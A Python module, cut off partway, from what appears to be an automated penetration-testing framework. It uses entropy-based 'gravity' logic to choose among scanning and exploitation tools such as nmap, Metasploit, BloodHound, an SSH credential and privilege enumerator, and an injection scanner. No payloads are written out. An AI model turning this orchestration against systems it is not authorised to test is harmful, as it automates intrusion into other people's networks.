"""
skg :: gravity_field.py

Gravity Field Engine — the operating principle of the substrate.

Gravity is not a scheduler. It is the field dynamics that gives
energy direction. Every sensor, adapter, and tool is an instrument
for introducing energy into the telemetry field. Gravity determines
which instrument to route to which region based on the entropy
gradient — not rules, not priority lists.

Physics:
  - Unknown wickets are high-entropy regions (superposition)
  - Observation collapses unknowns to realized or blocked (measurement)
  - Collapse is reversible — changing the instrument can re-emerge projections
  - Each instrument has observational reach (wavelength) — some regions
    are only visible to certain instruments
  - When an instrument fails to reduce entropy, gravity shifts to
    a different instrument rather than retrying
  - The system follows geodesics through the entropy landscape

Field energy: E = H(π | T) — Shannon entropy of projection given telemetry
  High E = many unknowns = strong gravitational pull
  Low E = mostly realized/blocked = weak pull
  E = 0 = fully determined = no pull

The gravity loop is continuous field dynamics:
  observation → energy change → entropy shift → gravity redirects → next observation

Usage:
  python gravity_field.py --auto --cycles 5
  python gravity_field.py --surface /var/lib/skg/discovery/surface_*.json
"""

import json
import sys
import os
import shlex
import time
import uuid
import math
import glob
import re
import subprocess
import importlib.util
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parents[1]
if str(REPO_ROOT) not in sys.path:
    sys.path.insert(0, str(REPO_ROOT))

from skg.core.paths import SKG_HOME, SKG_STATE_DIR, DISCOVERY_DIR, EVENTS_DIR, INTERP_DIR
from skg.forge.proposals import create_action, interactive_review
from skg.kernel.engine import KernelStateEngine as _KernelStateEngine
from skg.kernel.pearl_manifold import load_pearl_manifold
from skg.kernel.pearls import Pearl, PearlLedger
from datetime import datetime, timezone
from typing import Optional
from collections import defaultdict
from dataclasses import dataclass, field as dc_field

# Instrument paths
def _resolve_web_adapter_dir() -> Path:
    candidate = SKG_HOME / "skg-web-toolchain" / "adapters" / "web_active"
    return candidate


def _resolve_web_projection_dir() -> Path:
    candidate = SKG_HOME / "skg-web-toolchain" / "projections"
    return candidate


WEB_ADAPTER = _resolve_web_adapter_dir()
WEB_PROJECTIONS = _resolve_web_projection_dir()
FEEDS_PATH = SKG_HOME / "feeds"
CVE_DIR = SKG_STATE_DIR / "cve"
PEARLS_FILE = SKG_STATE_DIR / "pearls.jsonl"
_pearls = PearlLedger(PEARLS_FILE)

# Kernel state engine — replaces last-write-wins observation with
# support vector aggregation per the formal model (Work 3 Section 4).
_kernel = _KernelStateEngine(DISCOVERY_DIR, EVENTS_DIR, CVE_DIR)
_pearl_manifold = None
try:
    _pearl_manifold = load_pearl_manifold(PEARLS_FILE)
except Exception:
    _pearl_manifold = None


def _pearl_reinforcement_boost(target_ip: str, instrument: "Instrument") -> float:
    if _pearl_manifold is None:
        return 0.0
    try:
        return _pearl_manifold.wavelength_boost(
            hosts=[target_ip],
            wavelength=list(getattr(instrument, "wavelength", []) or []),
        )
    except Exception:
        return 0.0

if WEB_ADAPTER.exists():
    sys.path.insert(0, str(WEB_ADAPTER))


def _load_module_from_file(module_name: str, file_path: Path):
    """Load a module by explicit file path to avoid sys.modules name collisions."""
    spec = importlib.util.spec_from_file_location(module_name, file_path)
    if spec is None or spec.loader is None:
        raise ImportError(f"cannot load module from {file_path}")
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


def _latest_surface_path() -> str:
    surfaces = glob.glob(str(DISCOVERY_DIR / "surface_*.json"))
    if not surfaces:
        return ""

    def _score(path: str) -> tuple[int, int, float]:
        try:
            data = json.loads(Path(path).read_text())
            targets = data.get("targets", []) or []
            target_count = sum(1 for t in targets if t.get("ip") or t.get("host"))
            service_count = sum(len(t.get("services", []) or []) for t in targets)
            return (target_count + service_count, target_count, os.path.getmtime(path))
        except Exception:
            return (0, 0, os.path.getmtime(path))

    return max(surfaces, key=_score)


def _has_recent_artifact(pattern: str, max_age_hours: float = 6.0) -> bool:
    matches = glob.glob(pattern)
    if not matches:
        return False
    latest = max(matches, key=os.path.getmtime)
    age_s = max(time.time() - os.path.getmtime(latest), 0.0)
    return age_s <= (max_age_hours * 3600.0)


def _parse_nmap_services(xml_file: Path) -> list[tuple[int, str, str]]:
    import xml.etree.ElementTree as ET

    services: list[tuple[int, str, str]] = []
    try:
        root = ET.parse(xml_file).getroot()
    except Exception:
        return services
    host_el = root.find("host")
    if host_el is None:
        return services
    for port_el in host_el.findall(".//port"):
        state_el = port_el.find("state")
        if state_el is None or state_el.get("state") != "open":
            continue
        svc_el = port_el.find("service")
        port = int(port_el.get("portid", "0") or 0)
        svc_name = svc_el.get("name", "") if svc_el is not None else ""
        product = svc_el.get("product", "") if svc_el is not None else ""
        version = svc_el.get("version", "") if svc_el is not None else ""
        extra = svc_el.get("extrainfo", "") if svc_el is not None else ""
        banner = " ".join(x for x in (product, version, extra) if x).strip()
        services.append((port, svc_name, banner))
    return services


def _classify_target_from_services(ip: str, services: list[tuple[int, str, str]], current_target: dict | None = None) -> dict:
    discovery = _load_module_from_file("skg_discovery_runtime", SKG_HOME / "skg-discovery" / "discovery.py")
    current_target = current_target or {}
    classified = discovery.classify_target(
        ip,
        services,
        os_guess=current_target.get("os", "unknown"),
        is_container=ip.startswith(("172.17.", "172.18.")),
    )
    classified["wicket_states"] = current_target.get("wicket_states", {})
    return classified


def _update_surface_target_record(surface_path: str, ip: str, services: list[tuple[int, str, str]] | None = None) -> None:
    if not surface_path:
        return
    p = Path(surface_path)
    if not p.exists():
        return
    try:
        surface = json.loads(p.read_text())
    except Exception:
        return
    targets = surface.get("targets", [])
    for idx, target in enumerate(targets):
        if target.get("ip") != ip:
            continue
        service_tuples = services
        if service_tuples is None:
            service_tuples = [
                (int(s.get("port", 0)), s.get("service", ""), s.get("banner", ""))
                for s in target.get("services", [])
            ]
        refreshed = _classify_target_from_services(ip, service_tuples, current_target=target)
        refreshed["wicket_states"] = load_wicket_states(ip)
        targets[idx] = refreshed
        surface["targets"] = targets
        surface.setdefault("meta", {})["targets_classified"] = len(targets)
        p.write_text(json.dumps(surface, indent=2))
        return


def _infer_target_identity_properties(target: dict) -> dict:
    services = target.get("services", []) or []
    domains = set(target.get("domains", []) or [])
    ports = {svc.get("port") for svc in services}
    names = {(svc.get("service") or svc.get("name") or "").lower() for svc in services}
    externally_observable_only = bool(services) and not any(
        p in {22, 139, 445, 3306, 5432} for p in ports
    )
    auth_surface_present = any(
        ("auth" in n) or (p in {22, 443})
        for n, p in (
            ((svc.get("service") or svc.get("name") or "").lower(), svc.get("port"))
            for svc in services
        )
    )
    interactive_surface_present = any(p in {80, 443, 8080, 8443, 8008, 8009} for p in ports)
    return {
        "externally_observable_only": externally_observable_only,
        "network_reachable_only": target.get("kind") == "external-web",
        "host_semantics_unconfirmed": 22 not in ports and "host" not in domains,
        "container_semantics_present": "container_escape" in domains,
        "data_semantics_present": "data_pipeline" in domains or any(
            p in {3306, 5432, 6379, 27017} for p in ports
        ),
        "interactive_surface_present": interactive_surface_present,
        "auth_surface_present": auth_surface_present,
        "service_names": sorted(n for n in names if n),
    }


def _instrument_observation_coherence(inst_name: str, target: dict) -> float:
    identity = _infer_target_identity_properties(target)
    domains = set(target.get("domains", []) or [])
    ports = {svc.get("port") for svc in target.get("services", []) or []}
    names = set(identity.get("service_names", []) or [])

    host_present = (not identity.get("host_semantics_unconfirmed")) or (22 in ports) or ("host" in domains)
    data_present = bool(identity.get("data_semantics_present"))
    container_present = bool(identity.get("container_semantics_present"))
    interactive_present = bool(identity.get("interactive_surface_present"))
    auth_present = bool(identity.get("auth_surface_present"))
    ai_present = ("ai_target" in domains) or any(p in {11434, 6333, 7860, 8888, 5001, 4000, 6006, 8001, 9000} for p in ports)
    iot_present = ("iot_firmware" in domains) or any(n in {"telnet", "upnp", "rtsp", "mqtt", "modbus"} for n in names)

    if inst_name == "nmap":
        return 1.0
    if inst_name == "pcap":
        return 1.0 if ports or interactive_present else 0.5
    if inst_name == "nvd_feed":
        return 1.0 if ports else 0.0
    if inst_name in {"http_collector", "auth_scanner"}:
        if interactive_present or "web" in domains:
            return 1.0 if (inst_name != "auth_scanner" or auth_present) else 0.7
        return 0.0
    if inst_name in {"ssh_sensor", "sysaudit"}:
        return 1.0 if host_present else 0.0
    if inst_name == "data_profiler":
        return 1.0 if data_present else 0.0
    if inst_name == "container_inspect":
        return 1.0 if container_present else 0.0
    if inst_name == "supply_chain":
        return 1.0 if (host_present or container_present or data_present) else 0.0
    if inst_name == "ai_probe":
        if ai_present:
            return 1.0
        if interactive_present or identity.get("network_reachable_only"):
            return 0.35
        return 0.0
    if inst_name == "binary_analysis":
        return 1.0 if ("binary_analysis" in domains) else 0.0
    if inst_name == "iot_firmware":
        return 1.0 if iot_present else 0.0
    if inst_name == "metasploit":
        if interactive_present or host_present or data_present or container_present or ai_present or iot_present:
            return 1.0
        return 0.0
    return 1.0


def _hydrate_surface_from_latest_nmap(surface_path: str) -> dict:
    if not surface_path:
        return {}
    p = Path(surface_path)
    if not p.exists():
        return {}
    try:
        surface = json.loads(p.read_text())
    except Exception:
        return {}
    changed = False
    for idx, target in enumerate(surface.get("targets", [])):
        ip = target.get("ip", "")
        matches = sorted(glob.glob(str(DISCOVERY_DIR / f"nmap_{ip}_*.xml")), key=os.path.getmtime)
        if not matches:
            target["wicket_states"] = load_wicket_states(ip)
            continue
        services = _parse_nmap_services(Path(matches[-1]))
        if services:
            refreshed = _classify_target_from_services(ip, services, current_target=target)
            refreshed["wicket_states"] = load_wicket_states(ip)
            if (
                refreshed.get("services") != target.get("services")
                or refreshed.get("domains") != target.get("domains")
                or refreshed.get("wicket_states") != target.get("wicket_states")
                or refreshed.get("os") != target.get("os")
                or refreshed.get("kind") != target.get("kind")
            ):
                surface["targets"][idx] = refreshed
                changed = True
        else:
            target["wicket_states"] = load_wicket_states(ip)
    if changed:
        surface.setdefault("meta", {})["targets_classified"] = len(surface.get("targets", []))
        p.write_text(json.dumps(surface, indent=2))
    return surface


def _load_persisted_fold_managers(folds_dir: Path) -> dict[str, object]:
    managers: dict[str, object] = {}
    try:
        from skg.kernel.folds import FoldManager
    except Exception:
        return managers
    if not folds_dir.exists():
        return managers
    for fold_file in folds_dir.glob("folds_*.json"):
        try:
            ip = fold_file.stem.replace("folds_", "").replace("_", ".")
            fm = FoldManager.load(fold_file)
            if fm.all():
                managers[ip] = fm
        except Exception:
            continue
    return managers


def iso_now() -> str:
    return datetime.now(timezone.utc).isoformat()


# ── Instruments ──────────────────────────────────────────────────────────
# Each instrument has:
#   - name: identifier
#   - wavelength: what regions of state space it can observe
#   - cost: time/resource cost per observation
#   - reach: what wickets it can potentially resolve
#   - available: whether the instrument exists on this system

@dataclass
class Instrument:
    name: str
    description: str
    wavelength: list  # What kinds of unknowns it can resolve
    cost: float       # Relative cost (1.0 = baseline HTTP request)
    available: bool = False
    last_used_on: dict = dc_field(default_factory=dict)  # ip → timestamp
    entropy_history: dict = dc_field(default_factory=dict)  # ip → [entropy_before, entropy_after]

    def failed_to_reduce(self, ip: str) -> bool:
        """Did this instrument fail to reduce entropy on this target?"""
        history = self.entropy_history.get(ip, [])
        if not history:
            return False
        # 999 = hard error sentinel (config missing, binary not found, etc.)
        if history[-1] >= 500:
            return True
        if len(history) >= 3:
            return history[-1] >= history[-2] >= history[-3]
        return False



def _load_nvd_key() -> str:
    """Load NVD API key from environment or /etc/skg/skg.env."""
    key = os.environ.get("NIST_NVD_API_KEY", "")
    if not key:
        skg_env = Path("/etc/skg/skg.env")
        if skg_env.exists():
            for line in skg_env.read_text().splitlines():
                line = line.strip()
                if line.startswith("NIST_NVD_API_KEY="):
                    key = line.split("=", 1)[1].strip().strip('"').strip("'")
                    if key:
                        os.environ["NIST_NVD_API_KEY"] = key
                    break
    return key


def _infer_domain_from_fold(fold) -> str:
    source = (getattr(fold, "constraint_source", "") or "").lower()
    detail = (getattr(fold, "detail", "") or "").lower()
    text = f"{source} {detail}"
    if any(x in text for x in ("apache", "nginx", "http", "https", "php", "tomcat", "ajp", "web")):
        return "web"
    if any(x in text for x in ("mysql", "postgres", "postgresql", "mssql", "redis", "mongodb", "oracle")):
        return "data_pipeline"
    if any(x in text for x in ("docker", "container", "kubernetes", "podman")):
        return "container_escape"
    if any(x in text for x in ("ssh", "sudo", "suid", "kernel", "host")):
        return "host"
    if any(x in text for x in ("mqtt", "coap", "samsung", "chromecast", "iot")):
        return "iot_firmware"
    return "web"


def _compiler_hints_from_fold(fold) -> dict:
    source = getattr(fold, "constraint_source", "") or ""
    detail = getattr(fold, "detail", "") or ""
    why = getattr(fold, "why", {}) or {}
    hints = {"packages": [], "keywords": []}
    if source.startswith("nvd_feed::"):
        cve_id = source.split("::", 1)[1]
        hints["keywords"].append(cve_id)
    attack_path_id = str(why.get("attack_path_id", "") or "")
    if attack_path_id:
        hints["keywords"].append(attack_path_id)
        for token in attack_path_id.replace("-", "_").split("_"):
            if len(token) >= 4:
                hints["keywords"].append(token.lower())
    service = str(why.get("service", "") or "")
    if service:
        detail = f"{detail} {service}".strip()
    for token in re.findall(r"\b(?:apache|php|nginx|tomcat|mysql|postgres(?:ql)?|redis|mongodb|docker|kubernetes)\b", detail, re.I):
        lowered = token.lower()
        hints["keywords"].append(lowered)
        hints["packages"].append(lowered)
    hints["keywords"] = sorted(set(hints["keywords"]))
    hints["packages"] = sorted(set(hints["packages"]))
    return hints


def _catalog_growth_command_for_fold(domain: str, fold, hints: dict) -> tuple[str, str]:
    detail = (getattr(fold, "detail", "") or "").strip()
    why = getattr(fold, "why", {}) or {}
    description = detail[:160] or f"{domain} fold suggests missing catalog coverage"
    if getattr(fold, "fold_type", "") == "projection":
        path_id = str(why.get("attack_path_id", "") or "")
        service = str(why.get("service", "") or domain)
        description = f"Catalog attack path coverage for {service} including {path_id or 'observed exploit chain'}"[:160]

    cmd = [
        "skg", "catalog", "compile",
        "--domain", domain,
        "--description", description,
        "--dry-run",
    ]
    packages = ",".join(sorted(set(hints.get("packages", []))))
    keywords = ",".join(sorted(set(hints.get("keywords", []))))
    if packages:
        cmd.extend(["--packages", packages])
    if keywords:
        cmd.extend(["--keywords", keywords])
    return " ".join(shlex.quote(part) for part in cmd), description


def _catalog_growth_command_for_cluster(domain: str, family: str, folds: list, hints: dict) -> tuple[str, str]:
    top_fold = folds[0]
    detail = (getattr(top_fold, "detail", "") or "").strip()
    if len(folds) > 1:
        description = f"Catalog missing {domain} coverage for {family} across {len(folds)} related folds"[:160]
    else:
        description = detail[:160] or f"{domain} fold suggests missing catalog coverage"

    cmd = [
        "skg", "catalog", "compile",
        "--domain", domain,
        "--description", description,
        "--dry-run",
    ]
    packages = ",".join(sorted(set(hints.get("packages", []))))
    keywords = ",".join(sorted(set(hints.get("keywords", []))))
    if packages:
        cmd.extend(["--packages", packages])
    if keywords:
        cmd.extend(["--keywords", keywords])
    return " ".join(shlex.quote(part) for part in cmd), description


def _fold_service_family(fold) -> str:
    source = getattr(fold, "constraint_source", "") or ""
    detail = getattr(fold, "detail", "") or ""

    service_match = re.search(r"Service:\s*([A-Za-z0-9_.+-]+)", detail)
    if service_match:
        return service_match.group(1).split("/", 1)[0].lower()

    text = f"{source} {detail}".lower()
    for token in (
        "php", "apache", "nginx", "tomcat", "mysql", "postgresql", "postgres",
        "redis", "mongodb", "docker", "kubernetes", "ssh", "sudo", "suid",
    ):
        if token in text:
            return token
    return "generic"


def _create_toolchain_proposals_from_folds(active_folds_by_ip: dict, surface_path: str) -> list[str]:
    try:
        from skg.forge.generator import generate_toolchain
        from skg.forge.validator import validate
        from skg.forge import proposals as forge_proposals
    except Exception:
        return []

    created: list[str] = []
    candidates = []
    for ip, fold_manager in active_folds_by_ip.items():
        for fold in fold_manager.all():
            if fold.fold_type not in {"structural", "contextual"}:
                continue
            if fold.discovery_probability < 0.7:
                continue
            candidates.append((ip, fold))

    grouped: dict[tuple[str, str, str], list] = defaultdict(list)
    for ip, fold in candidates:
        domain = _infer_domain_from_fold(fold)
        family = _fold_service_family(fold)
        grouped[(ip, domain, family)].append(fold)

    existing = forge_proposals.proposals_for_dedupe(include_archived=True)

    for (ip, domain, family), folds in grouped.items():
        if not folds:
            continue
        def _fold_weight(fold) -> float:
            weight = getattr(fold, "gravity_weight", 0.0)
            if callable(weight):
                weight = weight()
            try:
                return float(weight)
            except Exception:
                return 0.0

        folds = sorted(
            folds,
            key=_fold_weight,
            reverse=True,
        )
        top_fold = folds[0]
        dedupe_key = f"{ip}:{domain}:{family}:{top_fold.fold_type}"

        if forge_proposals.is_in_cooldown(domain):
            continue

        if any(
            p.get("proposal_kind") == "toolchain_generation"
            and p.get("domain") == domain
            and dedupe_key in (p.get("evidence") or "")
            for p in existing
        ):
            continue

        compiler_packages = set()
        compiler_keywords = set()
        collection_hints = set()
        fold_ids = []
        evidence_lines = [dedupe_key]
        for fold in folds:
            fold_ids.append(getattr(fold, "id", ""))
            collection_hints.add(getattr(fold, "constraint_source", ""))
            hints = _compiler_hints_from_fold(fold)
            compiler_packages.update(hints.get("packages", []))
            compiler_keywords.update(hints.get("keywords", []))
            detail = (getattr(fold, "detail", "") or "").strip()
            if detail:
                evidence_lines.append(f"- {detail}")

        summary = f"{len(folds)} {domain} fold{'s' if len(folds) != 1 else ''} on {family}"
        description = (
            f"{summary} lack wicket/toolchain coverage"
            if len(folds) > 1
            else (getattr(top_fold, "detail", "")[:160] or f"{domain} structural gap")
        )
        gap = {
            "service": family if family != "generic" else domain,
            "attack_surface": getattr(top_fold, "detail", ""),
            "hosts": [ip],
            "category": f"{top_fold.fold_type}_fold_cluster",
            "evidence": "\n".join(evidence_lines[:12]),
            "forge_ready": True,
            "collection_hints": sorted(h for h in collection_hints if h),
            "compiler_hints": {
                "packages": sorted(compiler_packages),
                "keywords": sorted(compiler_keywords),
            },
            "fold_count": len(folds),
            "fold_ids": [fid for fid in fold_ids if fid],
        }

        try:
            gen_result = generate_toolchain(
                domain=domain,
                description=description,
                gap=gap,
                resonance_engine=None,
            )
            if not gen_result.get("success"):
                continue
            staged_path = Path(gen_result["staging_path"])
            try:
                val_result = validate(staged_path)
            except Exception:
                val_result = {"passed": False, "checks": {}, "tc_name": domain}
            proposal = forge_proposals.create(
                domain=domain,
                description=description,
                gap=gap,
                generation_result=gen_result,
                validation_result=val_result,
            )
            created.append(proposal["id"])
        except Exception:
            continue

    return created


def _create_catalog_growth_proposals_from_folds(active_folds_by_ip: dict) -> list[str]:
    try:
        from skg.forge import proposals as forge_proposals
    except Exception:
        return []

    created: list[str] = []
    existing = forge_proposals.proposals_for_dedupe(include_archived=True)
    grouped: dict[tuple[str, str, str], list] = defaultdict(list)
    for ip, fold_manager in active_folds_by_ip.items():
        for fold in fold_manager.all():
            if fold.fold_type not in {"contextual", "projection"}:
                continue
            if float(getattr(fold, "discovery_probability", 0.0) or 0.0) < 0.7:
                continue
            domain = _infer_domain_from_fold(fold)
            family = _fold_service_family(fold)
            grouped[(ip, domain, family)].append(fold)

    for (ip, domain, family), folds in grouped.items():
        if forge_proposals.is_in_cooldown(domain):
            continue

        def _fold_weight(fold) -> float:
            weight = getattr(fold, "gravity_weight", 0.0)
            if callable(weight):
                weight = weight()
            try:
                return float(weight)
            except Exception:
                return 0.0

        folds = sorted(folds, key=_fold_weight, reverse=True)
        top_fold = folds[0]
        dedupe_key = f"{ip}:{domain}:catalog_growth:{family}:{top_fold.fold_type}"
        if any(
            p.get("proposal_kind") == "catalog_growth"
            and p.get("domain") == domain
            and p.get("status") not in {"expired", "rejected", "superseded"}
            and dedupe_key in (p.get("evidence") or "")
            for p in existing
        ):
            continue

        compiler_packages = set()
        compiler_keywords = set()
        fold_ids = []
        evidence_lines = [dedupe_key]
        for fold in folds:
            fold_id = getattr(fold, "id", "")
            if fold_id:
                fold_ids.append(fold_id)
            hints = _compiler_hints_from_fold(fold)
            compiler_packages.update(hints.get("packages", []))
            compiler_keywords.update(hints.get("keywords", []))
            detail = (getattr(fold, "detail", "") or "").strip()
            if detail:
                evidence_lines.append(f"- {detail}")

        hints = {
            "packages": sorted(compiler_packages),
            "keywords": sorted(compiler_keywords),
        }
        command, description = _catalog_growth_command_for_cluster(domain, family, folds, hints)
        top_detail = (getattr(top_fold, "detail", "") or "").strip()
        category = f"{top_fold.fold_type}_fold_cluster"
        if len({getattr(f, 'fold_type', '') for f in folds}) > 1:
            category = "mixed_fold_cluster"

        proposal = forge_proposals.create_catalog_growth(
            domain=domain,
            description=description,
            hosts=[ip],
            attack_surface=top_detail,
            evidence="\n".join(evidence_lines[:12]),
            category=category,
            compiler_hints=hints,
            fold_ids=fold_ids,
            command=command,
        )
        cluster_fold_ids = set(fold_ids)
        legacy_ids = []
        for existing_proposal in existing:
            if existing_proposal.get("proposal_kind") != "catalog_growth":
                continue
            if existing_proposal.get("status") != "pending":
                continue
            if existing_proposal.get("domain") != domain:
                continue
            if list(existing_proposal.get("hosts", []) or []) != [ip]:
                continue
            if existing_proposal.get("id") == proposal["id"]:
                continue
            existing_fold_ids = set(existing_proposal.get("fold_ids", []) or [])
            if existing_fold_ids and existing_fold_ids.issubset(cluster_fold_ids):
                legacy_ids.append(existing_proposal["id"])
        if legacy_ids:
            try:
                forge_proposals.supersede(
                    legacy_ids,
                    replacement_id=proposal["id"],
                    reason="clustered_catalog_growth",
                )
            except Exception:
                pass
        created.append(proposal["id"])
        existing.append(proposal)

    return created

def detect_instruments() -> dict:
    """Detect which instruments are available on the system."""
    instruments = {}

    # HTTP collector — unauthenticated web scanning
    instruments["http_collector"] = Instrument(
        name="http_collector",
        description="Unauthenticated HTTP recon — headers, paths, forms, basic injection",
        wavelength=["WB-01", "WB-02", "WB-03", "WB-04", "WB-05", "WB-06",
                     "WB-09", "WB-11", "WB-12", "WB-17", "WB-18", "WB-19",
                     "WB-22", "WB-24"],
        cost=1.0,
        available=(WEB_ADAPTER / "collector.py").exists(),
    )

    # Authenticated scanner — post-auth surface with CSRF handling
    instruments["auth_scanner"] = Instrument(
        name="auth_scanner",
        description="Authenticated scanning — CSRF-aware login, post-auth injection testing",
        wavelength=["WB-06", "WB-07", "WB-08", "WB-09", "WB-10", "WB-11",
                     "WB-12", "WB-13", "WB-14", "WB-15", "WB-22"],
        cost=3.0,
        available=(WEB_ADAPTER / "auth_scanner.py").exists(),
    )

    # NVD feed — CVE intelligence for discovered services
    instruments["nvd_feed"] = Instrument(
        name="nvd_feed",
        description="NVD CVE lookup — maps service versions to known vulnerabilities",
        wavelength=["CVE-*", "WB-20"],  # CVE wickets + db privilege indicators
        cost=2.0,
        available=(FEEDS_PATH / "nvd_ingester.py").exists() and bool(_load_nvd_key()),
    )

    # Metasploit — exploitation framework
    msf_available = bool(subprocess.run(
        ["which", "msfconsole"], capture_output=True).returncode == 0)
    instruments["metasploit"] = Instrument(
        name="metasploit",
        description="Metasploit auxiliary/exploit modules — can bypass app-layer defenses",
        wavelength=["WB-09", "WB-10", "WB-14", "WB-20", "WB-21",
                     "CE-*", "HO-*", "AD-*"],
        cost=5.0,
        available=msf_available,
    )

    # Tshark/pcap — network-layer observation
    tshark_available = bool(subprocess.run(
        ["which", "tshark"], capture_output=True).returncode == 0)
    instruments["pcap"] = Instrument(
        name="pcap",
        description="Packet capture — observes interactions from the wire, bypasses app-layer opacity",
        wavelength=["WB-09", "WB-15", "WB-16", "WB-18",
                     "HO-*", "AD-*"],
        cost=2.0,
        available=tshark_available,
    )

    # SSH sensor — direct host access
    instruments["ssh_sensor"] = Instrument(
        name="ssh_sensor",
        description="SSH remote enumeration — kernel, SUID, sudo, creds, services",
        wavelength=["HO-*", "CE-*"],
        cost=2.0,
        available=(SKG_HOME / "skg" / "sensors" / "ssh_sensor.py").exists(),
    )

    # Nmap — network scanner
    nmap_available = bool(subprocess.run(
        ["which", "nmap"], capture_output=True).returncode == 0)
    instruments["nmap"] = Instrument(
        name="nmap",
        description="Network scanner — service detection, version fingerprinting, NSE scripts",
        wavelength=["WB-01", "WB-02", "WB-17", "HO-*"],
        cost=3.0,
        available=nmap_available,
    )

    # BloodHound — AD domain enumeration via BloodHound CE REST API or Neo4j
    # Wavelength: all AD lateral wickets (kerberoastable, delegation, ACLs, etc.)
    # Availability: requires BH CE running on localhost:8080 or Neo4j on 7687
    bh_url = os.environ.get("BH_URL", "http://localhost:8080")
    bh_user = os.environ.get("BH_USERNAME", "admin")
    bh_pass = os.environ.get("BH_PASSWORD", "")
    neo4j_pass = os.environ.get("NEO4J_PASSWORD", "")
    bh_available = bool(bh_pass or neo4j_pass)
    if bh_available:
        # Quick reachability check — don't block startup if BH is down
        try:
            import urllib.request
            urllib.request.urlopen(bh_url, timeout=2)
        except Exception:
            bh_available = False
    instruments["bloodhound"] = Instrument(
        name="bloodhound",
        description="BloodHound CE — AD object graph: kerberoastable, ACLs, delegation, stale DAs",
        wavelength=["AD-01", "AD-02", "AD-03", "AD-04", "AD-05",
                     "AD-06", "AD-07", "AD-08", "AD-09", "AD-10",
                     "AD-11", "AD-12", "AD-13", "AD-14", "AD-15",
                     "AD-16", "AD-17", "AD-18", "AD-19", "AD-20",
                     "AD-21", "AD-22", "AD-23", "AD-24", "AD-25"],
        cost=4.0,
        available=bh_available,
    )

    # Data pipeline profiler — connects to databases and emits DP-* wicket events
    # Wavelength: all DP-01..DP-15 wickets
    # Availability: requires SQLAlchemy and at least one configured data source
    data_profiler_path = SKG_HOME / "skg-data-toolchain" / "adapters" / "db_profiler" / "profile.py"
    # data_profiler only available if data_sources.yaml has actual entries
    _ds_file = Path("/etc/skg/data_sources.yaml")
    try:
        import yaml as _yaml
        _ds_cfg = _yaml.safe_load(_ds_file.read_text()) if _ds_file.exists() else {}
        data_sources_configured = bool((_ds_cfg or {}).get("data_sources"))
    except Exception:
        data_sources_configured = False
    try:
        import importlib.util
        spec = importlib.util.find_spec("sqlalchemy")
        sqlalchemy_available = spec is not None
    except Exception:
        sqlalchemy_available = False
    instruments["data_profiler"] = Instrument(
        name="data_profiler",
        description="DB profiler — schema, completeness, freshness, drift, integrity for data pipelines",
        wavelength=["DP-01", "DP-02", "DP-03", "DP-04", "DP-05",
                     "DP-06", "DP-07", "DP-08", "DP-09", "DP-10",
                     "DP-11", "DP-12", "DP-13", "DP-14", "DP-15"],
        cost=2.0,
        # Available when the profiler script exists. Data sources are derived
        # from the surface services list at execution time — mysql/postgres
        # on the target surface IS the data source. No pre-configuration needed.
        available=data_profiler_path.exists(),
    )

    # Binary analysis — checksec, rabin2, radare2, ROPgadget, pwndbg
    # Directed toward BA-* wickets when binary integrity unknowns are high-entropy
    # Available when at least one analysis tool is present
    binary_tools = ["checksec", "rabin2", "r2", "ROPgadget", "ltrace"]
    binary_available = any(
        subprocess.run(["which", t], capture_output=True).returncode == 0
        for t in binary_tools
    )

    # System auditor — filesystem, process, and log integrity via SSH
    sysaudit_path = SKG_HOME / "skg-host-toolchain" / "adapters" / "sysaudit" / "audit.py"
    instruments["sysaudit"] = Instrument(
        name="sysaudit",
        description="System integrity audit — filesystem hashes, process manifest, log integrity",
        wavelength=[
            "FI-01", "FI-02", "FI-03", "FI-04", "FI-05",
            "FI-06", "FI-07", "FI-08",
            "PI-01", "PI-02", "PI-03", "PI-04", "PI-05",
            "PI-06", "PI-07", "PI-08",
            "LI-01", "LI-02", "LI-03", "LI-04", "LI-05",
            "LI-06", "LI-07", "LI-08",
        ],
        cost=3.0,
        available=sysaudit_path.exists(),
    )

    # Container inspect — runs docker inspect from host, emits CE-* wickets
    # No SSH needed -- works from archbox against any container in scope
    ce_parse_path = SKG_HOME / "skg-container-escape-toolchain" / "adapters" / "container_inspect" / "parse.py"
    docker_available = subprocess.run(["which","docker"],capture_output=True).returncode == 0
    instruments["container_inspect"] = Instrument(
        name="container_inspect",
        description="Docker inspect — CE-01 root, CE-02 privileged, CE-03 socket, CE-04 API",
        wavelength=["CE-01","CE-02","CE-03","CE-04","CE-05","CE-06","CE-07"],
        cost=1.5,
        available=ce_parse_path.exists() and docker_available,
    )

    # Binary analysis — checksec, rabin2, ltrace, ROPgadget
    # Wavelength: BA-01..BA-06  Cost: 4.0 (static + dynamic)
    instruments["binary_analysis"] = Instrument(
        name="binary_analysis",
        description="Binary exploitation analysis — NX/ASLR/canary, dangerous functions, ROP gadgets",
        wavelength=["BA-01", "BA-02", "BA-03", "BA-04", "BA-05", "BA-06"],
        cost=4.0,
        available=binary_available,
    )

    # IoT firmware probe — network-side + offline image analysis
    # Wavelength: IF-01..IF-15
    iot_probe_path = SKG_HOME / "skg-iot_firmware-toolchain" / "adapters" / "firmware_probe" / "probe.py"
    instruments["iot_firmware"] = Instrument(
        name="iot_firmware",
        description="IoT firmware probe — banner grab + CVE version check for embedded components",
        wavelength=[f"IF-{i:02d}" for i in range(1, 16)],
        cost=2.0,
        available=iot_probe_path.exists(),
    )

    # Supply chain SBOM checker — SSH package collection + CVE cross-reference
    # Wavelength: SC-01..SC-12
    sc_probe_path = SKG_HOME / "skg-supply-chain-toolchain" / "adapters" / "sbom_check" / "check.py"
    instruments["supply_chain"] = Instrument(
        name="supply_chain",
        description="Supply chain SBOM check — installed packages vs CVE catalog",
        wavelength=[f"SC-{i:02d}" for i in range(1, 13)],
        cost=2.0,
        available=sc_probe_path.exists(),
    )

    # AI/ML service probe — Ollama, OpenAI-compat, Qdrant, Chroma, Jupyter, MLflow
    AI_PROBE_PATH = SKG_HOME / "skg-ai-toolchain" / "adapters" / "ai_probe" / "probe.py"
    instruments["ai_probe"] = Instrument(
        name="ai_probe",
        description="AI/ML target probe — Ollama, OpenAI-compat, Qdrant, Chroma, Jupyter, MLflow, Triton",
        wavelength=["AI-01", "AI-02", "AI-03", "AI-04", "AI-05", "AI-06",
                    "AI-07", "AI-08", "AI-09", "AI-10", "AI-11", "AI-12",
                    "AI-13", "AI-14", "AI-15", "AI-16", "AI-17", "AI-18",
                    "AI-19", "AI-20"],
        cost=3.0,
